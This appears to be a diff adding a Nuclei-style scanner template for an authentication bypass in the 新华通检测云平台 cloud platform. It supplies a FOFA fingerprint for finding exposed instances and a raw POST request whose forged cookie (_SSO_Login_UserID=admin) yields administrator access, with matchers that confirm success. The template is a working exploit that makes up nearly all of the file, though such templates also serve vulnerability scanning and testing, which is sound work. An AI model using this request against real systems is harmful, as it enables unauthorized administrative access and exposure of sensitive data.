@@ -1,0 +1,33 @@
+id: xinhuatong-cloud-sso-auth-bypass
+
+info:
+  name: "新华通检测云平台_SSO_Login_UserID 接口身份验证绕过"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="513304261"
+          珠海新华通软件股份有限公司云平台在_SSO_Login_UserID接口实现中存在身份验证逻辑缺陷。攻击者可通过构造特定Cookie或篡改请求参数实现身份验证绕过，直接获取后台管理权限。该漏洞可能导致系统配置暴露、敏感数据泄露及未授权操作，建议立即部署身份验证强化措施。
+  tags: 新华通检测云平台
+
+http:
+- raw:
+  - |
+    POST /Main/Desktop/Default.aspx HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Content-Length: 0
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Cookie: ASP.NET_SessionId=x01ftldfm5dwbbo1tx1ne1kv; #_SSO_Login_UserID=admin; #_SSO_Login_UserID_Guid=
+    X-Requested-With: XMLHttpRequest
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'SystemName'
+  - type: word
+    part: body
+    words:
+    - 'admin'
